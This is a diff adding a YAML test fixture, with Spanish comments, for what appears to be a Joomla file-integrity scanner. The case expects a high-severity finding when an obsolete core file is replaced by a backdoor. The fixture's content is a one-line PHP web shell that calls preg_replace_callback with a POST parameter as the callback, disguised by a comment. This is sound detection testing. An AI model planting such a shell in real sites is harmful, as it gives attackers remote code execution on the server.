@@ -1,0 +1,19 @@
+# Positivo (R6): archivo obsoleto conocido cuyo contenido NO coincide con
+# ninguna versión que lo distribuyó → escondite clásico.
+case: obsolete-turned-shell
+base:
+  cms: joomla
+  version: "1.1.0"
+expect:
+  exit_code: 1
+  findings:
+    - rule_id: J0W-CORE-009
+      subject: libraries/legacy.php
+      min_severity: high
+  not_findings:
+    - rule_id: J0W-CORE-011
+      subject: libraries/legacy.php
+mutations:
+  - op: add_file
+    path: libraries/legacy.php
+    content: "<?php\n// parece el legacy de siempre\npreg_replace_callback('/.*/', $_POST['f'], 'x');\n"
